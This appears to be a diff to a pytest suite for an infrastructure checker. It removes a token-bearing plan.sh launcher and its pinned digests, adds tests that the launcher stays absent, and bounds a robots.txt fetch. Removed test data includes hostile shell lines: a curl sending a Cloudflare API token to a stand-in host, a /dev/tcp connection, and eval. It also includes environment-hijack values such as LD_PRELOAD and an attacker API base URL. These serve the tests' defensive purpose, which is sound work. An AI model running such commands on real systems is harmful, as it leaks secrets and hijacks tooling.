@@ -12,15 +12,14 @@ structural (docs/edge.md, "Structural controls").
 
 from __future__ import annotations
 
+import ast
 import copy
-import hashlib
 import ipaddress
 import json
 import re
 import shutil
 import socket
 import subprocess
-import sys
 import urllib.error
 import urllib.request
 from importlib.machinery import SourceFileLoader
@@ -40,8 +39,7 @@ FILES = (
     "variables.tf",
     ".terraform.lock.hcl",
     "provider-fields.json",
-    "plan.sh",
-    "tofu.rc",
+    ".gitignore",
 )
 OVERRIDE_VARS = (
     "HTTPS_PROXY",
@@ -261,7 +259,7 @@ def tracked_text() -> dict[str, str]:
 def test_the_text_scan_sees_the_whole_repository() -> None:
     files = tracked_text()
     assert len(files) > 100
-    for name in ("deploy/edge/plan.sh", ".github/workflows/ci.yml", "docs/edge.md"):
+    for name in ("deploy/edge/main.tf", ".github/workflows/ci.yml", "docs/edge.md"):
         assert name in files
 
 
@@ -736,17 +734,11 @@ def test_saving_over_an_existing_file_is_exit_2_not_a_crash(
     assert SENTINEL not in capsys.readouterr().err
 
 
-def test_plan_usage_error_is_not_the_changes_planned_exit_code() -> None:
-    env = {"PATH": "/usr/bin:/bin"}
-    run = subprocess.run(  # noqa: S603 (fixed repo script, no token set)
-        [str(REPO / EDGE / "plan.sh")],
-        env=env,
-        capture_output=True,
-        text=True,
-        check=False,
-    )
-    assert run.returncode == 64  # tofu's detailed exit code 2 means changes planned
-    assert "not set" in run.stderr
+def edit_file(root: Path, name: str, old: str, new: str) -> None:
+    path = root / EDGE / name
+    text = path.read_text()
+    assert old in text
+    path.write_text(text.replace(old, new, 1))
 
 
 def test_the_doc_lists_the_open_owner_decisions() -> None:
@@ -754,222 +746,6 @@ def test_the_doc_lists_the_open_owner_decisions() -> None:
     assert "## Open owner decisions" in doc
     for topic in ("zone", "repository", "State", "requests_per_period"):
         assert topic in doc.split("## Open owner decisions", 1)[1], topic
-
-
-def test_plan_script_is_executable() -> None:
-    assert (REPO / EDGE / "plan.sh").stat().st_mode & 0o111
-
-
-ALLOWED_TOFU_ENV = {
-    "PATH",
-    "HOME",
-    "TMPDIR",
-    "TF_DATA_DIR",
-    "TF_VAR_zone_id",
-    "TF_CLI_CONFIG_FILE",
-    "CLOUDFLARE_API_TOKEN",
-    "_",  # set by bash itself for the program it starts
-    "SHLVL",  # added by bash itself, no secret
-    "LC_CTYPE",  # added by bash itself, no secret
-}
-
-
-def make_fake_tofu(home: Path, dump: Path, mode: int = 0o755) -> Path:
-    bindir = home / ".local" / "bin"
-    bindir.mkdir(parents=True)
-    fake = bindir / "tofu"
-    fake.write_text(
-        "#!" + sys.executable + "\n"
-        "import json, os, sys\n"
-        f"with open({str(dump)!r}, 'a') as h:\n"
-        "    row = [sys.argv[1:], dict(os.environ), os.getcwd()]\n"
-        "    h.write(json.dumps(row) + chr(10))\n"
-        f"rc = {str(dump) + '.rc'!r}\n"
-        "if sys.argv[1] == 'plan' and os.path.exists(rc):\n"
-        "    sys.exit(int(open(rc).read()))\n"
-    )
-    fake.chmod(mode)
-    return fake
-
-
-def plan_env(home: Path, extra: dict[str, str]) -> dict[str, str]:
-    # TOFU_BIN pins the fake: a real tofu must never run from these tests.
-    return {
-        "PATH": "/usr/bin:/bin",
-        "HOME": str(home),
-        "TOFU_BIN": str(home / ".local" / "bin" / "tofu"),
-        "TF_VAR_zone_id": "1" * 32,
-        "CLOUDFLARE_API_TOKEN": SENTINEL,
-        **extra,
-    }
-
-
-def run_plan(
-    tmp_path: Path, extra: dict[str, str], mode: int = 0o755
-) -> tuple[subprocess.CompletedProcess[str], list[Any]]:
-    home = tmp_path / "home"
-    dump = tmp_path / "env.json"
-    make_fake_tofu(home, dump, mode)
-    run = subprocess.run(  # noqa: S603 (fixed repo script; fake tofu, no network)
-        [str(REPO / EDGE / "plan.sh")],
-        env=plan_env(home, extra),
-        capture_output=True,
-        text=True,
-        check=False,
-    )
-    calls = (
-        [json.loads(x) for x in dump.read_text().splitlines()] if dump.exists() else []
-    )
-    return run, calls
-
-
-def test_plan_gives_tofu_only_the_allow_listed_environment(tmp_path: Path) -> None:
-    hostile = {
-        "TF_CLI_CONFIG_FILE": "/nonexistent/evil.tfrc",
-        "TF_PLUGIN_CACHE_DIR": "/nonexistent/evil-cache",
-        "TF_DATA_DIR": "/nonexistent/evil-data",
-        "TF_VAR_other": "x",
-        "TF_LOG": "TRACE",
-        "TF_LOG_PATH": "/nonexistent/leak.log",
-        "HTTPS_PROXY": "http://proxy.invalid:3128",
-        "https_proxy": "http://proxy.invalid:3128",
-        "ALL_PROXY": "http://proxy.invalid:3128",
-        "SSL_CERT_FILE": "/nonexistent/evil-ca.pem",
-        "SSL_CERT_DIR": "/nonexistent/evil-cas",
-        "CLOUDFLARE_API_KEY": "k",
-        "CLOUDFLARE_EMAIL": "e",
-        "CLOUDFLARE_API_USER_SERVICE_KEY": "u",
-        "CLOUDFLARE_API_BASE_URL": "https://attacker.invalid",
-        "TF_CLI_ARGS": "-lock=false",
-        "TF_CLI_ARGS_plan": "-destroy",
-        "LD_PRELOAD": "/nonexistent/evil.so",
-        "BASH_ENV": "/nonexistent/evil.sh",
-        "ENV": "/nonexistent/evil.sh",
-        "OPENTOFU_THING": "x",
-    }
-    run, calls = run_plan(tmp_path, hostile)
-    assert run.returncode == 0, run.stderr
-    assert [c[0][0] for c in calls] == ["init", "plan"]
-    for _argv, env, cwd in calls:
-        assert set(env) <= ALLOWED_TOFU_ENV, sorted(set(env) - ALLOWED_TOFU_ENV)
-        assert env["CLOUDFLARE_API_TOKEN"] == SENTINEL
-        assert env["TF_VAR_zone_id"] == "1" * 32
-        assert env["PATH"] == "/usr/bin:/bin"
-        assert env["HOME"] != str(tmp_path / "home")  # a fresh scratch home
-        assert env["TF_CLI_CONFIG_FILE"] == str(REPO / EDGE / "tofu.rc")
-        scratch = Path(env["HOME"]).parent
-        assert Path(env["TF_DATA_DIR"]).parent == scratch == Path(env["TMPDIR"]).parent
-        assert Path(cwd) == REPO / EDGE
-    assert not Path(calls[0][1]["HOME"]).parent.exists()  # removed again
-    assert SENTINEL not in run.stdout + run.stderr
-    assert not any(a in ("apply", "destroy", "import") for c in calls for a in c[0])
-
-
-def test_plan_refuses_a_relative_tofu_bin(tmp_path: Path) -> None:
-    run, calls = run_plan(tmp_path, {"TOFU_BIN": "tofu"})
-    assert run.returncode == 65 and calls == []
-
-
-def test_plan_ignores_a_tofu_earlier_on_path(tmp_path: Path) -> None:
-    evil = tmp_path / "evil"
-    evil.mkdir()
-    marker = tmp_path / "evil-ran"
-    (evil / "tofu").write_text(f"#!/bin/sh\ntouch {marker}\n")
-    (evil / "tofu").chmod(0o755)
-    run, calls = run_plan(tmp_path, {"PATH": f"{evil}:/usr/bin:/bin"})
-    assert run.returncode == 0, run.stderr
-    assert not marker.exists()
-    assert len(calls) == 2
-
-
-@pytest.mark.parametrize("mode", [0o777, 0o757, 0o775, 0o770, 0o720, 0o722])
-def test_plan_refuses_a_binary_writable_by_others(tmp_path: Path, mode: int) -> None:
-    run, calls = run_plan(tmp_path, {}, mode)
-    assert run.returncode == 65
-    assert calls == []
-    assert "no trusted tofu" in run.stderr
-    assert SENTINEL not in run.stdout + run.stderr
-
-
-def test_plan_refuses_a_binary_in_a_directory_writable_by_others(
-    tmp_path: Path,
-) -> None:
-    home = tmp_path / "home"
-    make_fake_tofu(home, tmp_path / "env.json")
-    (home / ".local" / "bin").chmod(0o777)  # no sticky bit
-    run = subprocess.run(  # noqa: S603 (fixed repo script; fake tofu, no network)
-        [str(REPO / EDGE / "plan.sh")],
-        env=plan_env(home, {}),
-        capture_output=True,
-        text=True,
-        check=False,
-    )
-    assert run.returncode == 65
-    assert not (tmp_path / "env.json").exists()
-
-
-@pytest.mark.parametrize("mode", [0o775, 0o770, 0o757])
-def test_plan_refuses_a_group_or_other_writable_directory_of_the_binary(
-    tmp_path: Path, mode: int
-) -> None:
-    home = tmp_path / "home"
-    make_fake_tofu(home, tmp_path / "env.json")
-    # Owned by the caller, whose primary group is the caller's own: a group
-    # member could still replace the binary, so it is refused too.
-    (home / ".local" / "bin").chmod(mode)
-    run = subprocess.run(  # noqa: S603 (fixed repo script; fake tofu, no network)
-        [str(REPO / EDGE / "plan.sh")],
-        env=plan_env(home, {}),
-        capture_output=True,
-        text=True,
-        check=False,
-    )
-    assert run.returncode == 65
-    assert not (tmp_path / "env.json").exists()
-    assert SENTINEL not in run.stdout + run.stderr
-
-
-def test_plan_refuses_a_malformed_zone_id(tmp_path: Path) -> None:
-    run, calls = run_plan(tmp_path, {"TF_VAR_zone_id": "not-a-zone"})
-    assert run.returncode == 64
-    assert calls == []
-
-
-def test_plan_usage_and_exit_codes_pass_through(tmp_path: Path) -> None:
-    run, calls = run_plan(tmp_path, {})
-    assert run.returncode == 0 and len(calls) == 2
-
-
-@pytest.mark.parametrize("code", [1, 2])
-def test_plan_passes_the_tools_own_exit_code_through(tmp_path: Path, code: int) -> None:
-    home = tmp_path / "home"
-    make_fake_tofu(home, tmp_path / "env.json")
-    (tmp_path / "env.json.rc").write_text(str(code))
-    run = subprocess.run(  # noqa: S603 (fixed repo script; fake tofu, no network)
-        [str(REPO / EDGE / "plan.sh")],
-        env=plan_env(home, {}),
-        capture_output=True,
-        text=True,
-        check=False,
-    )
-    assert run.returncode == code
-
-
-def test_the_reviewed_cli_config_installs_only_the_locked_provider() -> None:
-    text = (REPO / EDGE / "tofu.rc").read_text()
-    code = "\n".join(x for x in text.splitlines() if not x.lstrip().startswith("#"))
-    assert "dev_overrides" not in code
-    assert "filesystem_mirror" not in code and "network_mirror" not in code
-    assert "plugin_cache_dir" not in code
-    assert 'include = ["registry.opentofu.org/cloudflare/cloudflare"]' in code
-    assert "direct" in code
-    assert code.count("{") == code.count("}") > 0
-
-
-def test_the_doc_does_not_overclaim_the_plan_environment() -> None:
-    doc = (REPO / "docs" / "edge.md").read_text()
-    assert "passes only `CLOUDFLARE_API_TOKEN` to the tool" not in doc
-    assert "allow-list" in doc and "tofu.rc" in doc
 
 
 # --- --site-host: no SSRF -----------------------------------------------------
@@ -1121,7 +897,15 @@ def test_the_robots_fetch_connects_to_the_validated_address_with_sni(
 
     def fake_create_connection(address: Any, timeout: Any = None) -> Any:
         connected.append(address)
-        return object()
+
+        class FakeSock:
+            def settimeout(self, value: Any) -> None:
+                pass
+
+            def close(self) -> None:
+                pass
+
+        return FakeSock()
 
     monkeypatch.setattr(check.socket, "create_connection", fake_create_connection)
     monkeypatch.setattr(check.ssl, "create_default_context", lambda: FakeContext())
@@ -1142,6 +926,8 @@ def test_the_robots_fetch_refuses_redirects_and_other_statuses(
             self.status = status
 
     class Conn:
+        sock = None
+
         def __init__(self, *a: Any, **k: Any) -> None:
             pass
 
@@ -1451,88 +1237,6 @@ def test_one_rule_matching_by_both_is_not_ambiguous() -> None:
     assert not any("ambiguous" in x for x in check.rate_differences(d, live_rules()))
 
 
-# --- the token-bearing launcher is pinned and scanned (#613) -------------------
-
-
-def edit_file(root: Path, name: str, old: str, new: str) -> None:
-    path = root / EDGE / name
-    text = path.read_text()
-    assert old in text
-    path.write_text(text.replace(old, new, 1))
-
-
-def digest(root: Path, name: str) -> str:
-    return hashlib.sha256((root / EDGE / name).read_bytes()).hexdigest()
-
-
-def test_the_launchers_match_their_reviewed_digests() -> None:
-    assert set(check.LAUNCHER_PINS) == {"plan.sh", "tofu.rc"}
-    for name, want in check.LAUNCHER_PINS.items():
-        assert hashlib.sha256((REPO / EDGE / name).read_bytes()).hexdigest() == want
-
-
-@pytest.mark.parametrize("name", ["plan.sh", "tofu.rc"])
-def test_any_change_to_a_token_adjacent_file_needs_a_new_pin(
-    root: Path, name: str
-) -> None:
-    path = root / EDGE / name
-    path.write_text(path.read_text() + "\n# harmless comment\n")
-    assert any(
-        "reviewed digest" in p and name in p for p in check.offline_problems(root)
-    )
-
-
-def test_a_missing_launcher_fails(root: Path) -> None:
-    (root / EDGE / "plan.sh").unlink()
-    assert any("plan.sh" in p for p in check.offline_problems(root))
-
-
-HOSTILE_LAUNCHERS = {
-    "split verb": 'verb=ap\nverb+=ply\nexec /usr/bin/tofu "$verb"\n',
-    "exfiltrate": 'curl --data-binary "$CLOUDFLARE_API_TOKEN" https://x.invalid/\n',
-    "token to a file": 'echo "$CLOUDFLARE_API_TOKEN" > /tmp/t\n',
-    "eval": 'eval "$X"\n',
-    "dev tcp": "echo hi > /dev/tcp/203.0.113.1/80\n",
-    "other verb": "run_tofu apply\n",
-    "interpreter": "python3 -c pass\n",
-    "backtick": "x=`id`\n",
-    "indirect": 'y="${!name}"\n',
-}
-
-
-@pytest.mark.parametrize("name", sorted(HOSTILE_LAUNCHERS))
-def test_the_structural_scan_refuses_hostile_launcher_text_even_when_pinned(
-    root: Path, monkeypatch: pytest.MonkeyPatch, name: str
-) -> None:
-    path = root / EDGE / "plan.sh"
-    path.write_text(path.read_text() + HOSTILE_LAUNCHERS[name])
-    # someone also updated the pin: the scan alone must still refuse
-    monkeypatch.setattr(
-        check,
-        "LAUNCHER_PINS",
-        {**check.LAUNCHER_PINS, "plan.sh": digest(root, "plan.sh")},
-    )
-    problems = check.offline_problems(root)
-    assert any(p.startswith("plan.sh") for p in problems), problems
-
-
-def test_the_scan_accepts_the_reviewed_launcher() -> None:
-    assert check.plan_script_problems((REPO / EDGE / "plan.sh").read_text()) == []
-
-
-def test_an_added_token_line_that_was_not_reviewed_is_refused() -> None:
-    text = (REPO / EDGE / "plan.sh").read_text() + 'x="$CLOUDFLARE_API_TOKEN"\n'
-    assert any("token" in p for p in check.plan_script_problems(text))
-
-
-def test_run_tofu_may_only_init_and_plan() -> None:
-    text = (REPO / EDGE / "plan.sh").read_text()
-    assert check.plan_script_problems(
-        text.replace("run_tofu init", "run_tofu init2", 1)
-    )
-    assert check.plan_script_problems(text + "run_tofu plan\n")
-
-
 def test_codeowners_names_the_edge_files_and_the_checker() -> None:
     owners = (REPO / ".github" / "CODEOWNERS").read_text()
     for path in (
@@ -1779,3 +1483,172 @@ def test_a_second_variable_block_fails(root: Path) -> None:
     path = root / EDGE / "variables.tf"
     path.write_text(path.read_text() + path.read_text().split("\n", 1)[1])
     assert any("once" in p for p in check.offline_problems(root))
+
+
+# --- no token-bearing launcher, required files, bounded robots fetch (#613) ----
+
+
+@pytest.mark.parametrize("name", ["plan.sh", "tofu.rc"])
+def test_the_launcher_files_are_absent_and_cannot_come_back(
+    root: Path, name: str
+) -> None:
+    assert not (REPO / EDGE / name).exists()
+    assert not (root / EDGE / name).exists()
+    (root / EDGE / name).write_text("# nothing\n")
+    problems = check.offline_problems(root)
+    assert any(name in p and "launcher" in p for p in problems), problems
+
+
+def test_no_file_in_deploy_edge_references_the_token_or_an_executable() -> None:
+    pattern = re.compile(
+        r"TOFU_BIN|CLOUDFLARE_API_TOKEN|CLOUDFLARE_EDGE_READ_TOKEN"
+        r"|TF_CLI_CONFIG_FILE|subprocess|Popen|os\.system",
+        re.I,
+    )
+    for path in sorted((REPO / EDGE).iterdir()):
+        text = path.read_bytes().decode("utf-8", "replace")
+        assert not pattern.search(text), path.name
+        assert not text.startswith("#!"), path.name
+        assert not path.stat().st_mode & 0o111, path.name
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "TOFU_BIN=/home/u/bin/tofu\n",
+        "# note\nexport CLOUDFLARE_API_TOKEN\n",
+        "import subprocess\n",
+        "#!/bin/sh\n",
+        "x = os.system('id')\n",
+        "TF_CLI_CONFIG_FILE=/x\n",
+    ],
+)
+def test_text_that_hands_a_token_to_a_program_fails_the_offline_check(
+    root: Path, text: str
+) -> None:
+    path = root / EDGE / ".gitignore"
+    path.write_text(path.read_text() + text)
+    problems = check.offline_problems(root)
+    assert any("pass an API token" in p for p in problems), problems
+
+
+def test_the_checker_itself_never_starts_a_program_or_looks_one_up() -> None:
+    tree = ast.parse((REPO / "scripts" / "check-edge.py").read_text())
+    banned_modules = {"subprocess", "pty", "multiprocessing", "ctypes"}
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Import):
+            assert not {a.name.split(".")[0] for a in node.names} & banned_modules
+        if isinstance(node, ast.ImportFrom):
+            assert (node.module or "").split(".")[0] not in banned_modules
+        if isinstance(node, ast.Attribute):
+            assert node.attr not in {"system", "popen", "execv", "execvp", "which"}
+            assert not (node.attr.startswith("spawn") or node.attr.startswith("exec"))
+
+
+def test_the_launcher_pin_machinery_is_gone() -> None:
+    for name in ("LAUNCHER_PINS", "plan_script_problems", "launcher_problems"):
+        assert not hasattr(check, name), name
+
+
+def test_the_docs_say_where_the_plan_runs_and_do_not_name_a_launcher() -> None:
+    doc = (REPO / "docs" / "edge.md").read_text()
+    assert "## Where the plan runs" in doc
+    assert "Spacelift" in doc.split("## Where the plan runs", 1)[1].split("##")[0]
+    for name in ("plan.sh", "tofu.rc", "TOFU_BIN"):
+        assert name not in doc, name
+
+
+def test_codeowners_limit_is_documented_as_a_repository_setting() -> None:
+    doc = (REPO / "docs" / "edge.md").read_text()
+    assert "Require review" in doc and "Code Owners" in doc
+    assert "repository setting" in doc
+
+
+@pytest.mark.parametrize("name", [*FILES, ".gitignore"])
+def test_a_missing_reviewed_file_fails_the_offline_check(root: Path, name: str) -> None:
+    (root / EDGE / name).unlink()
+    assert any(name in p for p in check.offline_problems(root))
+
+
+def test_removing_variables_tf_fails_with_a_clear_message(root: Path) -> None:
+    (root / EDGE / "variables.tf").unlink()
+    problems = check.offline_problems(root)
+    assert any("variables.tf" in p and "missing" in p for p in problems), problems
+    # the module check on its own also refuses a folder with no variable block
+    assert any("exactly once" in p for p in check.module_problems(root / EDGE))
+
+
+def test_no_variable_block_fails_even_if_the_file_exists(root: Path) -> None:
+    (root / EDGE / "variables.tf").write_text("# empty\n")
+    assert any("exactly once" in p for p in check.offline_problems(root))
+
+
+def test_the_robots_fetch_tries_at_most_a_few_addresses(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    addresses = [f"93.184.216.{n}" for n in range(1, 101)]
+    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(addresses))
+    tried: list[Any] = []
+
+    def refuse(address: Any, timeout: Any = None) -> Any:
+        tried.append(address)
+        raise OSError("down")
+
+    monkeypatch.setattr(check.socket, "create_connection", refuse)
+    with pytest.raises(check.Unreadable):
+        check.fetch_robots("links.example.com")
+    assert len(tried) == check.ROBOTS_MAX_ADDRESSES
+
+
+def test_the_robots_fetch_has_one_overall_deadline(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    addresses = [f"93.184.216.{n}" for n in range(1, 4)]
+    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(addresses))
+    clock = [1000.0]
+    monkeypatch.setattr(check.time, "monotonic", lambda: clock[0])
+    tried: list[Any] = []
+
+    def slow(address: Any, timeout: Any = None) -> Any:
+        tried.append((address, timeout))
+        clock[0] += check.ROBOTS_DEADLINE  # the attempt used the whole budget
+        raise OSError("timed out")
+
+    monkeypatch.setattr(check.socket, "create_connection", slow)
+    with pytest.raises(check.Unreadable, match="exceeded"):
+        check.fetch_robots("links.example.com")
+    assert len(tried) == 1  # no second attempt after the budget is gone
+    assert tried[0][1] <= check.TIMEOUT
+
+
+def test_a_slow_drip_body_cannot_outlast_the_deadline(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(check.socket, "getaddrinfo", fake_resolver(["93.184.216.34"]))
+    clock = [1000.0]
+    monkeypatch.setattr(check.time, "monotonic", lambda: clock[0])
+
+    class Sock:
+        def settimeout(self, value: float) -> None:
+            pass
+
+    class Response:
+        status = 200
+
+        def read(self, n: int) -> bytes:
+            clock[0] += 10.0  # each chunk arrives 10 seconds later
+            return b"x"
+
+    real = check.PinnedHTTPSConnection
+
+    def Conn(host: str, address: str, timeout: float, deadline: Any) -> Any:
+        conn = real(host, address, timeout, deadline)
+        conn.sock = Sock()
+        conn.request = lambda *a, **k: None
+        conn.getresponse = lambda: Response()
+        conn.close = lambda: None
+        return conn
+
+    monkeypatch.setattr(check, "PinnedHTTPSConnection", Conn)
+    with pytest.raises(check.Unreadable, match="exceeded"):
+        check.fetch_robots("links.example.com")
